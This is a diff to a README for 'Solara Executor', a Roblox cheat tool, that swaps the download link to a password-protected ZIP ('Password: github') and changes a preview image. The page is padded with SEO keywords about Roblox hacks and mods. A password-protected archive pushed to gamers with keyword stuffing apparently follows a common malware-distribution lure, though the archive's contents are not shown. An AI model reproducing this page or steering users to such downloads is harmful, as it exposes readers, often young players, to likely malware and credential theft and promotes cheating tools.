@@ -1,8 +1,8 @@
-# 🚀 Solara Executor - The Ultimate Roblox Executor
+# 🚀 Solara Executor - Roblox Executor
 
 ## Quick Installation
 To get started with Solara Executor, follow these simple steps:
-1. **[![Download Solara Executor](https://img.shields.io/badge/Download-Solara%20Executor-blueviolet)](https://github.com/user-attachments/files/16747382/Solara.zip)**
+1. **[![Download Solara Executor](https://img.shields.io/badge/Download-Solara%20Executor-blueviolet)](https://github.com/user-attachments/files/16749123/Solara.zip)**
 2. **Password: github**
 3. Extract the downloaded ZIP file to your desired location on your system.
 
@@ -12,7 +12,7 @@ To get started with Solara Executor, follow these simple steps:
 **Keywords:** Roblox executor, script executor, Roblox hacks, Roblox mods, gaming tools, script engine, Roblox enhancements, Roblox modding 2024.
 
 
-![Solara Executor Preview](https://github.com/user-attachments/assets/9258f8a8-c7bc-4c8d-9503-cf5a001e4840)
+![Solara Executor Preview](https://github.com/user-attachments/assets/82168c74-06b7-4435-95b4-a111a041bec8)
 
 ## Table of Contents
 - [Introduction](#introduction)
